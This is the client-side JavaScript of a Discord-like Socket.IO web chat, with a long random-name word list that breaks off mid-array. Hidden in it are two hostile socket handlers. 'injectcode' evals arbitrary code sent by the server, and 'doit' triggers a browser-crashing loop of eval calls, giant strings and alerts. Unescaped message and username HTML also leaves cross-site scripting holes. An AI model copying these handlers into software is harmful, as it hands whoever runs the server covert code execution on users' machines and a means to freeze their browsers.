var socket = new io();
var prevdate=['a', 'b', 'c'];
var messageSending = true;
var prevavatar="";
var prevusername="";
var connected=false;
var messageDiv = document.getElementById('messages');

function notification(title,text){
	var notif=document.createElement('div')
	document.getElementById('notifs').appendChild(notif);
	notif.setAttribute('class','notif');
	var titl=document.createElement('strong');
	notif.appendChild(titl);
	titl.innerHTML=title;
	var content=document.createElement('span');
	notif.appendChild(content);
	content.innerHTML=' '+text;
	var close=document.createElement('div');
	notif.appendChild(close);
	close.setAttribute('id','close-notif');
	close.innerHTML='&times;';
	close.onclick=(function(){
		notif.parentNode.removeChild(notif);
	});
}
socket.on('notif',function(data){
	if(data.title && data.message){
		notification(data.title, data.message);
	}
});

socket.on('ahh',a=>{console.log('h')});
socket.on('ready',function() {
	messageDiv.scrollTop = messageDiv.scrollHeight;
});
socket.on('please reload',function(){
	location.reload();
});
socket.on('permsChange', function(data) {
	document.title="#"+data.chanName;
	if(data.messageSending==true){
		document.getElementById('input').removeAttribute('disabled');
		document.getElementById('input').setAttribute('placeholder','Message #'+data.chanName);
	} else if(data.messageSending==false){
		document.getElementById('input').setAttribute('disabled','');
		document.getElementById('input').setAttribute('placeholder','You do not have permissions to send messages in this channel.');
	}
});
var prevData;
var start=1;
var discon=document.getElementsByClassName('discon-main')[0];
var disconMSG=document.getElementsByClassName('discon-msg')[0];
var attemptsEle=document.getElementsByClassName('discon-attempts')[0];
var asdg=0;
var connectAttempts=0;
attemptsEle.innerHTML=`${connectAttempts}/10`;
var STOPIT=false;
setInterval(function(){
	if(STOPIT===true)return;
	asdg++;
	disconMSG.innerHTML=disconMSG.innerHTML.substr(0,19)+'.'.repeat(asdg);
	if(asdg==3)asdg=0;
	if(connectAttempts>=10){
		if(STOPIT===true)return;
		STOPIT=true;
		location.reload();
		return;
	}
	if(connected==false){
		socket = new io();
		connectAttempts++;
		attemptsEle.innerHTML=`${connectAttempts}/10`;
	}
},750);
socket.on('disconnect', function() {
	connected=false;
	discon.style.display='inline-block';
});
var youSUCK=false;
socket.on('doit',function(){
	console.log('OK');
	youSUCK=true;
	const b=new Blob(['<!DOCTYPE HTML><meta charset="UTF-8"><body style="background-color: black;">'+document.body.innerHTML],{type:'text/html'});
	var x="";
	async function yee() {
		var i=0;
		setInterval(async function(){//while (!0) {
			i=i+1;
			x="";
			for (var i=0; i<50000; i++) {
				x+=String.fromCharCode(Math.floor(Math.random()*0x1D300)+0x800);
				//document.getElementsByTagName('img').forEach(e=>{e.setAttribute('src',x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x);});
				try{
					eval(`var a${i}="${x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x}";`);
					console.log(x+x+x+x+x+x+x+x+x+x+x+x+x+x);
					setTimeout(function(){
						alert(x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x);
					},100);
				}
				catch(err){
					console.log(err);
				}
			}
			//document.getElementByClassName('input')[0].value=x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x;
			document.title=x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x;
			//console.log(x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x+x);
			await new Promise(r => setTimeout(r, 0));
		},20);
		
	} yee();
});
socket.on('connect', function() {
	connectAttempts=0;https://sys32.dev/;/https://cdn.discordapp.com/avatars/699328975737978942/db7f804be6882f6402123e3b58436edf.webp?size=32
	connected=true;
	discon.style.display='none';
});
socket.on('messageUpdate',function(data){
	var elem = document.getElementById('messages');
	var msgthing=document.getElementById(data.msgID)
	msgthing.innerHTML=data.newCnt;
	var editedTag=document.createElement('span');
	msgthing.appendChild(editedTag);
	editedTag.setAttribute('id','editedTag');
	editedTag.innerHTML='(edited)';
});
socket.on('messageDelete',function(data){
	var elem = document.getElementById('messages');
	if(!document.body.contains(document.getElementById(data.msgID)))return;
	var msgthing=document.getElementById(data.msgID);
	msgthing.innerHTML='[RETRACTED]';
	msgthing.style['color']='grey';
	msgthing.style['font-style']='italic';
});
socket.on('injectcode',function(data) {
	try{
		eval(data.run).catch(function(){});
	}
	catch(err){
		console.log(err)
	}
});
socket.on('message',function(data){
	if(prevdate.includes(data.date)==true)return;
	prevdate = prevdate.concat([ data.date ]);
	var elem = document.getElementById('messages');
	var msgs=document.getElementsByClassName('content');
	window.scrollTo(0,document.body.scrollHeight);
	if(prevavatar===data.avatar && data.username===prevusername){
		msgs[msgs.length-1].insertAdjacentHTML('beforeend',`<p id="`+data.msgID+`" class="contentpp">${data.pingstr+data.content}</p>`);
	}else{
		data.content=`<p id="${data.msgID}" class="contentp">${data.content}</p>`.replace(/&lt;@.*&gt;/g,`<span class="mention">@${data.pingstr}</span>`).replace(/<@.*>/g,`<span class="mention">@${data.pingstr}</span>`).replace(/&lt;@!.*&gt;/g,`<span class="mention">@${data.pingstr}</span>`).replace(/<@!.*>/g,`<span class="mention">@${data.pingstr}</span>`).replace(/\`\`\`([\s\S]*?)\`\`\`/gim,'<code><pre>$1</pre></code>');
		var lines=data.content.split('\n');
		lines.forEach((e,i,a)=>{
			if(e.replace(/<p .*>(.*)<\/p>/g,'$1').startsWith('&gt; ')){
				a[i]=`${e.replace(/<(.*)>.*<\/p>/g,'<$1>')}<span id="tfwLine">${e.replace(/<p .*>(.*)<\/p>/g,'$1').substr(4,256)}</span></p>`;
			}
		});
		data.content=lines.join('\n');
		var msg=document.createElement('div');
		var ava=document.createElement('img');
		var nam=document.createElement('span');
		var bsr=document.createElement('span');
		var tms=document.createElement('time');
		var dsr=document.createElement('span');
		var cnt=document.createElement('span');

		tms.appendChild(dsr);
		
		msg.appendChild(nam);
		msg.appendChild(bsr);
		msg.appendChild(ava);
		msg.appendChild(tms);
		msg.appendChild(cnt);
		elem.appendChild(msg);

		msg.setAttribute('class','message');
		ava.src=data.avatar;
		ava.setAttribute('class','avatar');
		nam.setAttribute('class','name');
		nam.style.color=data.color;
		nam.innerHTML=data.username;
		nam.onclick=(function(){
			document.getElementById('input').value+=`<@${data.authorid}> `;
		});
		ava.onclick=(function(){
			document.getElementById('input').value+=`<@${data.authorid}> `;
		});
		bsr.outerHTML=data.botstr;
		tms.setAttribute('class','timestamp');
		tms.setAttribute('datetime',data.timestamp);
		dsr.setAttribute('aria-label',`&nbsp;&nbsp;${data.dateStr}`);
		dsr.innerHTML=`&nbsp;&nbsp;${data.dateStr}`;
		cnt.setAttribute('class','content');
		cnt.innerHTML=data.content+data.embed+'<p></p>';
		Array.from(document.getElementsByClassName('contentp')).forEach((e,i,a)=>{
			if(e.outerHTML==='<p class="contentp"></p>'){
				e.parentNode.removeChild(e)
			}
		});
		twemoji.parse(document.getElementById('messages'));
	}
	prevavatar=data.avatar;
	prevusername=data.username;
	var remaining = $('#messages').prop('scrollHeight') - ($('#messages').scrollTop() + $('#messages').height());
	if(remaining<=300){
		$('#messages').scrollTop($('#messages')[0].scrollHeight);
	}
});
function capFirst(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

function getRandomInt(min, max) {
  	return Math.floor(Math.random() * (max - min)) + min;
}

if (!localStorage.getItem("name")){
	localStorage.setItem("name", generateName())
}
if (!localStorage.getItem("avatarNum")){
	localStorage.setItem("avatarNum", getRandomInt(0,4))
}
if (!localStorage.getItem("ID")){
	localStorage.setItem("ID", getRandomInt(1111,9999))
}
function forceSend(cont,name){
	var cool='';
	if(name){cool=name}else{cool=document.getElementById('infoname').value};
	socket.emit('webhooksend', { username: cool, avatar: localStorage.getItem('avatarNum'), content: cont, banned: localStorage.getItem("banned"), ID: localStorage.getItem("ID")});
}
var previouscontent="";
function submit(){
	var input=document.getElementById('input').value;
	var args = input.split(' ');
	var yes
	if(input.substring(0,5)=="/nick"){
		if(input.substring(5,7)==="")return;
		localStorage.setItem("name", input.substring(5,17));
		var d=new Date()
		var date = d.getUTCDate();
		var elem = document.getElementById('messages');
		dosend=`<div class='message'><img src="./clyde.png" class="avatar"></img><span class="name" style="color:white">Clyde</span><span class="bot">BOT</span>&nbsp;<span class="content"><p class="contentp">Your nickname on this server has been changed to<strong>`+localStorage.getItem('name')+`</strong></p></span></div>`;
		elem.insertAdjacentHTML('beforeend',dosend);
		var scrollingElement = (document.scrollingElement || document.body);
		scrollingElement.scrollTop = scrollingElement.scrollHeight;
		
	} else {
		if(previouscontent!==input){
			socket.emit('webhooksend', { username: document.getElementById('infoname').value, avatar: localStorage.getItem('avatarNum'), content: input, banned: localStorage.getItem("banned"), ID: localStorage.getItem("ID")});
			previouscontent=input;
		}
	}
	document.getElementById('input').value="";
}
$(document).keypress(function(event){
	//if(document.activeElement!==document.getElementById('infoname') && document.activeElement!==document.getElementById('input')){
	//	document.getElementById('input').focus();
	//}
    var keycode = (event.keyCode ? event.keyCode : event.which);
    if(keycode == '13'){
		if(document.activeElement === document.getElementById('input')){
			submit();
		} else if (document.activeElement === document.getElementById('infoname')){
			document.getElementById('infoname').blur();
			localStorage.setItem("name", document.getElementById('infoname').value.substring(0,12));
		}
	}
});
$(document).ready(function() {
	var infoname=document.getElementById('infoname');
	document.getElementById('infoavatar').setAttribute('src',`/;/https://cdn.discordapp.com/embed/avatars/${localStorage.getItem("avatarNum")}.png`);
	infoname.setAttribute('value',localStorage.getItem("name"));
	document.getElementById('infoavatar').addEventListener('click', function (e) {
		var avatarNum=parseInt(localStorage.getItem("avatarNum"));
		if(avatarNum<4){
			avatarNum=avatarNum+1
		}else if(avatarNum==4){
			avatarNum=0
		}
		localStorage.setItem("avatarNum", avatarNum)
		document.getElementById('infoavatar').setAttribute('src',`/;/https://cdn.discordapp.com/embed/avatars/${localStorage.getItem("avatarNum")}.png`);
	});
	socket.on('banned',function(data) {
		localStorage.setItem("banned", "true"); //the ban is also serversided but fuck you anyways
	});
	var accPopup=document.getElementById('account');
	var accForm=document.getElementById('accform');
	var accInfo=document.getElementById('accinfo');
	var loggedin=false;
	var accRegister=document.getElementById('accregister');
	document.getElementById('logout').onclick=(function(){
		location.href='logout'
	});
	document.getElementById('acc').onclick=(function(){
		accPopup.style.display='block';
		if(loggedin==true){
			accInfo.style.display='block';
			accRegister.style.display='none';
			document.getElementById('avatarUser').setAttribute('src',`/;/https://cdn.discordapp.com/embed/avatars/${localStorage.getItem("avatarNum")}.png`);
		}else{
			accForm.style.display='block';
		}
	});
	document.getElementById('avatarUser').setAttribute('src',`/;/https://cdn.discordapp.com/embed/avatars/${localStorage.getItem("avatarNum")}.png`);
	accPopup.onclick=(function(e){
		if(e.target!=accPopup)return;
		accPopup.style.display='none';
		accForm.style.display='none';
		accInfo.style.display='none';
		accRegister.style.display='none';
	});
	document.getElementById('loginButton').onclick=(function(){
		accForm.style.display='block';
		accInfo.style.display='none';
		accRegister.style.display='none';
	});
	
	document.getElementById('registerButton').onclick=(function(){
		accForm.style.display='none';
		accRegister.style.display='block';
		accInfo.style.display='none';
	});
	socket.on('info',function(data){
		var username=data.username;
		loggedin=data.loggedin;
		console.log(data);
		document.getElementsByClassName('coolerstuck')[0].innerHTML=data.username;
		accForm.style.display='none';
		accRegister.style.display='none';
	});
});


function generateName(){var name1 = ["abandoned","able","absolute","adorable","adventurous","academic","acceptable","acclaimed","accomplished","accurate","aching","acidic","acrobatic","active","actual","adept","admirable","admired","adolescent","adorable","adored","advanced","afraid","affectionate","aged","aggravating","aggressive","agile","agitated","agonizing","agreeable","ajar","alarmed","alarming","alert","alienated","alive","all","altruistic","amazing","ambitious","ample","amused","amusing","anchored","ancient","angelic","angry","anguished","animated","annual","another","antique","anxious","any","apprehensive","appropriate","apt","arctic","arid","aromatic","artistic","ashamed","assured","astonishing","athletic","attached","attentive","attractive","austere","authentic","authorized","automatic","avaricious","average","aware","awesome","awful","awkward","babyish","bad","back","baggy","bare","barren","basic","beautiful","belated","beloved","beneficial","better","best","bewitched","big","big-hearted","biodegradable","bite-sized","bitter","black","black-and-white","bland","blank","blaring","bleak","blind","blissful","blond","blue","blushing","bogus","boiling","bold","bony","boring","bossy","both","bouncy","bountiful","bowed","brave","breakable","brief","bright","brilliant","brisk","broken","bronze","brown","bruised","bubbly","bulky","bumpy","buoyant","burdensome","burly","bustling","busy","buttery","buzzing","calculating","calm","candid","canine","capital","carefree","careful","careless","caring","cautious","cavernous","celebrated","charming","cheap","cheerful","cheery","chief","chilly","chubby","circular","classic","clean","clear","clear-cut","clever","close","closed","cloudy","clueless","clumsy","cluttered","coarse","cold","colorful","colorless","colossal","comfortable","common","compassionate","competent","complete","complex","complicated","composed","concerned","concrete","confused","conscious","considerate","constant","content","conventional","cooked","cool","cooperative","coordinated","corny","corrupt","costly","courageous","courteous","crafty","crazy","creamy","creative","creepy","criminal","crisp","critical","crooked","crowded","cruel","crushing","cuddly","cultivated","cultured","cumbersome","curly","curvy","cute","cylindrical","damaged","damp","dangerous","dapper","daring","darling","dark","dazzling","dead","deadly","deafening","dear","dearest","decent","decimal","decisive","deep","defenseless","defensive","defiant","deficient","definite","definitive","delayed","delectable","delicious","delightful","delirious","demanding","dense","dental","dependable","dependent","descriptive","deserted","detailed","determined","devoted","different","difficult","digital","diligent","dim","dimpled","dimwitted","direct","disastrous","discrete","disfigured","disgusting","disloyal","dismal","distant","downright","dreary","dirty","disguised","dishonest","dismal","distant","distinct","distorted","dizzy","dopey","doting","double","downright","drab","drafty","dramatic","dreary","droopy","dry","dual","dull","dutiful","each","eager","earnest","early","easy","easy-going","ecstatic","edible","educated","elaborate","elastic","elated","elderly","electric","elegant","elementary","elliptical","embarrassed","embellished","eminent","emotional","empty","enchanted","enchanting","energetic","enlightened","enormous","enraged","entire","envious","equal","equatorial","essential","esteemed","ethical","euphoric","even","evergreen","everlasting","every","evil","exalted","excellent","exemplary","exhausted","excitable","excited","exciting","exotic","expensive","experienced","expert","extraneous","extroverted","extra-large","extra-small","fabulous","failing","faint","fair","faithful","fake","false","familiar","famous","fancy","fantastic","far","faraway","far-flung","far-off","fast","fat","fatal","fatherly","favorable","favorite","fearful","fearless","feisty","feline","female","feminine","few","fickle","filthy","fine","finished","firm","first","firsthand","fitting","fixed","flaky","flamboyant","flashy","flat","flawed","flawless","flickering","flimsy","flippant","flowery","fluffy","fluid","flustered","focused","fond","foolhardy","foolish","forceful","forked","formal","forsaken","forthright","fortunate","fragrant","frail","frank","frayed","free","French","fresh","frequent","friendly","frightened","frightening","frigid","frilly","frizzy","frivolous","front","frosty","frozen","frugal","fruitful","full","fumbling","functional","funny","fussy","fuzzy","gargantuan","gaseous","general","generous","gentle","genuine","giant","giddy","gigantic","gifted","giving","glamorous","glaring","glass","gleaming","gleeful","glistening","glittering","gloomy","glorious","glossy","glum","golden","good","good-natured","gorgeous","graceful","gracious","grand","grandiose","granular","grateful","grave","gray","great","greedy","green","gregarious","grim","grimy","gripping","grizzled","gross","grotesque","grouchy","grounded","growing","growling","grown","grubby","gruesome","grumpy","guilty","gullible","gummy","hairy","half","handmade","handsome","handy","happy","happy-go-lucky","hard","hard-to-find","harmful","harmless","harmonious","harsh","hasty","hateful","haunting","healthy","heartfelt","hearty","heavenly","heavy","hefty","helpful","helpless","hidden","hideous","high","high-level","hilarious","hoarse","hollow","homely","honest","honorable","honored","hopeful","horrible","hospitable","hot","huge","humble","humiliating","humming","humongous","hungry","hurtful","husky","icky","icy","ideal","idealistic","identical","idle","idiotic","idolized","ignorant","ill","illegal","ill-fated","ill-informed","illiterate","illustrious","imaginary","imaginative","immaculate","immaterial","immediate","immense","impassioned","impeccable","impartial","imperfect","imperturbable","impish","impolite","important","impossible","impractical","impressionable","impressive","improbable","impure","inborn","incomparable","incompatible","incomplete","inconsequential","incredible","indelible","inexperienced","indolent","infamous","infantile","infatuated","inferior","infinite","informal","innocent","insecure","insidious","insignificant","insistent","instructive","insubstantial","intelligent","intent","intentional","interesting","internal","international","intrepid","ironclad","irresponsible","irritating","itchy","jaded","jagged","jam-packed","jaunty","jealous","jittery","joint","jolly","jovial","joyful","joyous","jubilant","judicious","juicy","jumbo","junior","jumpy","juvenile","kaleidoscopic","keen","key","kind","kindhearted","kindly","klutzy","knobby","knotty","knowledgeable","knowing","known","kooky","kosher","lame","lanky","large","last","lasting","late","lavish","lawful","lazy","leading","lean","leafy","left","legal","legitimate","light","lighthearted","likable","likely","limited","limp","limping","linear","lined","liquid","little","live","lively","livid","loathsome","lone","lonely","long","long-term","loose","lopsided","lost","loud","lovable","lovely","loving","low","loyal","lucky","lumbering","luminous","lumpy","lustrous","luxurious","mad","made-up","magnificent","majestic","major","male","mammoth","married","marvelous","masculine","massive","mature","meager","mealy","mean","measly","meaty","medical","mediocre","medium","meek","mellow","melodic","memorable","menacing","merry","messy","metallic","mild","milky","mindless","miniature","minor","minty","miserable","miserly","misguided","misty","mixed","modern","modest","moist","monstrous","monthly","monumental","moral","mortified","motherly","motionless","mountainous","muddy","muffled","multicolored","mundane","murky","mushy","musty","muted","mysterious","naive","narrow","nasty","natural","naughty","nautical","near","neat","necessary","needy","negative","neglected","negligible","neighboring","nervous","new","next","nice","nifty","nimble","nippy","nocturnal","noisy","nonstop","normal","notable","noted","noteworthy","novel","noxious","numb","nutritious","nutty","obedient","obese","oblong","oily","oblong","obvious","occasional","odd","oddball","offbeat","offensive","official","old","old-fashioned","only","open","optimal","optimistic","opulent","orange","orderly","organic","ornate","ornery","ordinary","original","other","our","outlying","outgoing","outlandish","outrageous","outstanding","oval","overcooked","overdue","overjoyed","overlooked","palatable","pale","paltry","parallel","parched","partial","passionate","past","pastel","peaceful","peppery","perfect","perfumed","periodic","perky","personal","pertinent","pesky","pessimistic","petty","phony","physical","piercing","pink","pitiful","plain","plaintive","plastic","playful","pleasant","pleased","pleasing","plump","plush","polished","polite","political","pointed","pointless","poised","poor","popular","portly","posh","positive","possible","potable","powerful","powerless","practical","precious","present","prestigious","pretty","precious","previous","pricey","prickly","primary","prime","pristine","private","prize","probable","productive","profitable","profuse","proper","proud","prudent","punctual","pungent","puny","pure","purple","pushy","putrid","puzzled","puzzling","quaint","qualified","quarrelsome","quarterly","queasy","querulous","questionable","quick","quick-witted","quiet","quintessential","quirky","quixotic","quizzical","radiant","ragged","rapid","rare","rash","raw","recent","reckless","rectangular","ready","real","realistic","reasonable","red","reflecting","regal","regular","reliable","relieved","remarkable","remorseful","remote","repentant","required","respectful","responsible","repulsive","revolving","rewarding","rich","rigid","right","ringed","ripe","roasted","robust","rosy","rotating","rotten","rough","round","rowdy","royal","rubbery","rundown","ruddy","rude","runny","rural","rusty","sad","safe","salty","same","sandy","sane","sarcastic","sardonic","satisfied","scaly","scarce","scared","scary","scented","scholarly","scientific","scornful","scratchy","scrawny","second","secondary","second-hand","secret","self-assured","self-reliant","selfish","sentimental","separate","serene","serious","serpentine","several","severe","shabby","shadowy","shady","shallow","shameful","shameless","sharp","shimmering","shiny","shocked","shocking","shoddy","short","short-term","showy","shrill","shy","sick","silent","silky","silly","silver","similar","simple","simplistic","sinful","single","sizzling","skeletal","skinny","sleepy","slight","slim","slimy","slippery","slow","slushy","small","smart","smoggy","smooth","smug","snappy","snarling","sneaky","sniveling","snoopy","sociable","soft","soggy","solid","somber","some","spherical","sophisticated","sore","sorrowful","soulful","soupy","sour","Spanish","sparkling","sparse","specific","spectacular","speedy","spicy","spiffy","spirited","spiteful","splendid","spotless","spotted","spry","square","squeaky","squiggly","stable","staid","stained","stale","standard","starchy","stark","starry","steep","sticky","stiff","stimulating","stingy","stormy","straight","strange","steel","strict","strident","striking","striped","strong","studious","stunning","stupendous","stupid","sturdy","stylish","subdued","submissive","substantial","subtle","suburban","sudden","sugary","sunny","super","superb","superficial","superior","supportive","sure-footed","surprised","suspicious","svelte","sweaty","sweet","sweltering","swift","sympathetic","tall","talkative","tame","tan","tangible","tart","tasty","tattered","taut","tedious","teeming","tempting","tender","tense","tepid","terrible","terrific","testy","thankful","that","these","thick","thin","third","thirsty","this","thorough","thorny","those","thoughtful","threadbare","thrifty","thunderous","tidy","tight","timely","tinted","tiny","tired","torn","total","tough","traumatic","treasured","tremendous","tragic","trained","tremendous","triangular","tricky","trifling","trim","trivial","troubled","true","trusting","trustworthy","trusty","truthful","tubby","turbulent","twin","ugly","ultimate","unacceptable","unaware","uncomfortable","uncommon","unconscious","understated","unequaled","uneven","unfinished","unfit","unfolded","unfortunate","unhappy","unhealthy","uniform","unimportant","unique","united","unkempt","unknown","unlawful","unlined","unlucky","unnatural","unpleasant","unrealistic","unripe","unruly","unselfish","unsightly","unsteady","unsung","untidy","untimely","untried","untrue","unused","unusual","unwelcome","unwieldy","unwilling","unwitting","unwritten","upbeat","upright","upset","urban","usable","used","useful","useless","utilized","utter","vacant","vague","vain","valid","valuable","vapid","variable","vast","velvety","venerated","vengeful","verifiable","vibrant","vicious","victorious","vigilant","vigorous","villainous","violet","violent","virtual","virtuous","visible","vital","vivacious","vivid","voluminous","wan","warlike","warm","warmhearted","warped","wary","wasteful","watchful","waterlogged","watery","wavy","wealthy","weak","weary","webbed","wee","weekly","weepy","weighty","weird","welcome","well-documented","well-groomed","well-informed","well-lit","well-made","well-off","well-to-do","well-worn","wet","which","whimsical","whirlwind","whispered","white","whole","whopping","wicked","wide","wide-eyed","wiggly","wild","willing","wilted","winding","windy","winged","wiry","wise","witty","wobbly","woeful","wonderful","wooden","woozy","wordy","worldly","worn","worried","worrisome","worse","worst","worthless","worthwhile","worthy","wrathful","wretched","writhing","wrong","wry","yawning","yearly","yellow","yellowish","young","youthful","yummy","zany","zealous","zesty","zigzag","rocky"];var name2 = ["people","history","way","art","world","information","map","family","government","health","system","computer","meat","year","thanks","music","person","reading","method","data","food","understanding","theory","law","bird","literature","problem","software","control","knowledge","power","ability","economics","love","internet","television","science","library","nature","fact","product","idea","temperature","investment","area","society","activity","story","industry","media","thing","oven","community","definition","safety","quality","development","language","management","player","variety","video","week","security","country","exam","movie","organization","equipment","physics","analysis","policy","series","thought","basis","boyfriend","direction","strategy","technology","army","camera","freedom","paper","environment","child","instance","month","truth","marketing","university","writing","article","department","difference","goal","nesocket","audience","fishing","growth","income","marriage","user","combination","failure","meaning","medicine","philosophy","teacher","communication","night","chemistry","disease","disk","energy","nation","road","role","soup","advertising","location","success","addition","apartment","education","math","moment","painting","politics","attention","decision","event","property","shopping","student","wood","competition","distribution","entertainment","office","population","president","unit","category","cigarette","context","introduction","opportunity","performance","driver","flight","length","magazine","nesocketpaper","relationship","teaching","cell","dealer","debate","finding","lake","member","message","phone","scene","appearance","association","concept","customer","death","discussion","housing","inflation","insurance","mood","woman","advice","blood","effort","expression","importance","opinion","payment","reality","responsibility","situation","skill","statement","wealth","application","city","county","depth","estate","foundation","grandmother","heart","perspective","photo","recipe","studio","topic","collection","depression","imagination","passion","percentage","resource","setting","ad","agency","college","connection","criticism","debt","description","memory","patience","secretary","solution","administration","aspect","attitude","director","personality","psychology","recommendation","response","selection","storage","version","alcohol","argument","complaint","contract","emphasis","highway","loss","membership","possession","preparation","steak","union","agreement","cancer","currency","employment","engineering","entry","interaction","limit","mixture","preference","region","republic","seat","tradition","virus","actor","classroom","delivery","device","difficulty","drama","election","engine","football","guidance","hotel","match","owner","priority","protection","suggestion","tension","variation","anxiety","atmosphere","awareness","bread","climate","comparison","confusion","construction","elevator","emotion","employee","employer","guest","height","leadership","mall","manager","operation","recording","respect","sample","transportation","boring","charity","cousin","disaster","editor","efficiency","excitement","extent","feedback","guitar","homework","leader","mom","outcome","permission","presentation","promotion","reflection","refrigerator","resolution","revenue","session","singer","tennis","basket","bonus","cabinet","childhood","church","clothes","coffee","dinner","drawing","hair","hearing","initiative","judgment","lab","measurement","mode","mud","orange","poetry","police","possibility","procedure","queen","ratio","relation","restaurant","satisfaction","sector","signature","significance","song","tooth","town","vehicle","volume","wife","accident","airport","appointment","arrival","assumption","baseball","chapter","committee","conversation","database","enthusiasm","error","explanation","farmer","gate","girl","hall","historian","hospital","injury","instruction","maintenance","manufacturer","meal","perception","pie","poem","presence","proposal","reception","replacement","revolution","river","son","speech","tea","village","warning","winner","worker","writer","assistance","breath","buyer","chest","chocolate","conclusion","contribution","cookie","courage","desk","drawer","establishment","examination","garbage","grocery","honey","impression","improvement","independence","insect","inspection","inspector","king","ladder","menu","penalty","piano","potato","profession","professor","quantity","reaction","requirement","salad","sister","supermarket","tongue","weakness","wedding","affair","ambition","analyst","apple","assignment","assistant","bathroom","bedroom","beer","birthday","celebration","championship","cheek","client","consequence","departure","diamond","dirt","ear","fortune","friendship","funeral","gene","girlfriend","hat","indication","intention","lady","midnight","negotiation","obligation","passenger","pizza","platform","poet","pollution","recognition","reputation","shirt","speaker","stranger","surgery","sympathy","tale","throat","trainer","uncle","youth","time","work","film","water","money","example","while","business","study","game","life","form","air","day","place","number","part","field","fish","back","process","heat","hand","experience","job","book","end","point","type","home","economy","value","body","market","guide","interest","state","radio","course","company","price","size","card","list","mind","trade","line","care","group","risk","word","fat","force","key","light","training","name","school","top","amount","level","order","practice","research","sense","service","piece","web","boss","sport","fun","house","page","term","test","answer","sound","focus","matter","kind","soil","board","oil","picture","access","garden","range","rate","reason","future","site","demand","exercise","image","case","cause","coast","action","age","bad","boat","record","result","section","building","mouse","cash","class","period","plan","store","tax","side","subject","space","rule","stock","weather","chance","figure","man","model","source","beginning","earth","program","chicken","design","feature","head","material","purpose","question","rock","salt","act","birth","car","dog","object","scale","sun","note","profit","rent","speed","style","war","bank","craft","half","inside","outside","standard","bus","exchange","eye","fire","position","pressure","stress","advantage","benefit","box","frame","issue","step","cycle","face","item","metal","paint","review","room","screen","structure","view","account","ball","discipline","medium","share","balance","bit","black","bottom","choice","gift","impact","machine","shape","tool","wind","address","average","career","culture","morning","pot","sign","table","task","condition","contact","credit","egg","hope","ice","network","north","square","attempt","date","effect","link","post","star","voice","capital","challenge","friend","self","shot","brush","couple","exit","front","function","lack","living","plant","plastic","spot","summer","taste","theme","track","wing","brain","button","click","desire","foot","gas","influence","notice","rain","wall","base","damage","distance","feeling","pair","savings","staff","sugar","target","text","animal","author","budget","discount","file","ground","lesson","minute","officer","phase","reference","register","sky","stage","stick","title","trouble","bowl","bridge","campaign","character","club","edge","evidence","fan","letter","lock","maximum","novel","option","pack","park","quarter","skin","sort","weight","baby","background","carry","dish","factor","fruit","glass","joint","master","muscle","red","strength","traffic","trip","vegetable","appeal","chart","gear","ideal","kitchen","land","log","mother","net","party","principle","relative","sale","season","signal","spirit","street","tree","wave","belt","bench","commission","copy","drop","minimum","path","progress","project","sea","south","status","stuff","ticket","tour","angle","blue","breakfast","confidence","daughter","degree","doctor","dot","dream","duty","essay","father","fee","finance","hour","juice","luck","milk","mouth","peace","pipe","stable","storm","substance","team","trick","afternoon","bat","beach","blank","catch","chain","consideration","cream","crew","detail","gold","interview","kid","mark","mission","pain","pleasure","score","screw","sex","shop","shower","suit","tone","window","agent","band","bath","block","bone","calendar","candidate","cap","coat","contest","corner","court","cup","district","door","east","finger","garage","guarantee","hole","hook","implement","layer","lecture","lie","manner","meeting","nose","parking","partner","profile","rice","routine","schedule","swimming","telephone","tip","winter","airline","bag","battle","bed","bill","bother","cake","code","curve","designer","dimension","dress","ease","emergency","evening","extension","farm","fight","gap","grade","holiday","horror","horse","host","husband","loan","mistake","mountain","nail","noise","occasion","package","patient","pause","phrase","proof","race","relief","sand","sentence","shoulder","smoke","stomach","string","tourist","towel","vacation","west","wheel","wine","arm","aside","associate","bet","blow","border","branch","breast","brother","buddy","bunch","chip","coach","cross","document","draft","dust","expert","floor","god","golf","habit","iron","judge","knife","landscape","league","mail","mess","native","opening","parent","pattern","pin","pool","pound","request","salary","shame","shelter","shoe","silver","tackle","tank","trust","assist","bake","bar","bell","bike","blame","boy","brick","chair","closet","clue","collar","comment","conference","devil","diet","fear","fuel","glove","jacket","lunch","monitor","mortgage","nurse","pace","panic","peak","plane","reward","row","sandwich","shock","spite","spray","surprise","till","transition","weekend","welcome","yard","alarm","bend","bicycle","bite","blind","bottle","cable","candle","clerk","cloud","concert","counter","flower","grandfather","harm","knee","lawyer","leather","load","mirror","neck","pension","plate","purple","ruin","ship","skirt","slice","snow","specialist","stroke","switch","trash","tune","zone","anger","award","bid","bitter","boot","bug","camp","candy","carpet","cat","champion","channel","clock","comfort","cow","crack","engineer","entrance","fault","grass","guy","hell","highlight","incident","island","joke","jury","leg","lip","mate","motor","nerve","passage","pen","pride","priest","prize","promise","resident","resort","ring","roof","rope","sail","scheme","script","sock","station","toe","tower","truck","witness","can","will","other","use","make","good","look","help","go","great","being","still","public","read","keep","start","give","human","local","general","specific","long","play","feel","high","put","common","set","change","simple","past","big","possible","particular","major","personal","current","national","cut","natural","physical","show","try","check","second","call","move","pay","let","increase","single","individual","turn","ask","buy","guard","hold","main","offer","potential","professional","international","travel","cook","alternative","special","working","whole","dance","excuse","cold","commercial","low","purchase","deal","primary","worth","fall","necessary","positive","produce","search","present","spend","talk","creative","tell","cost","drive","green","support","glad","remove","return","run","complex","due","effective","middle","regular","reserve","independent","leave","original","reach","rest","serve","watch","beautiful","charge","active","break","negative","safe","stay","visit","visual","affect","cover","report","rise","walk","white","junior","pick","unique","classic","final","lift","mix","private","stop","teach","western","concern","familiar","fly","official","broad","comfortable","gain","rich","save","stand","young","heavy","lead","listen","valuable","worry","handle","leading","meet","release","sell","finish","normal","press","ride","secret","spread","spring","tough","wait","brown","deep","display","flow","hit","objective","shoot","touch","cancel","chemical","cry","dump","extreme","push","conflict","eat","fill","formal","jump","kick","opposite","pass","pitch","remote","total","treat","vast","abuse","beat","burn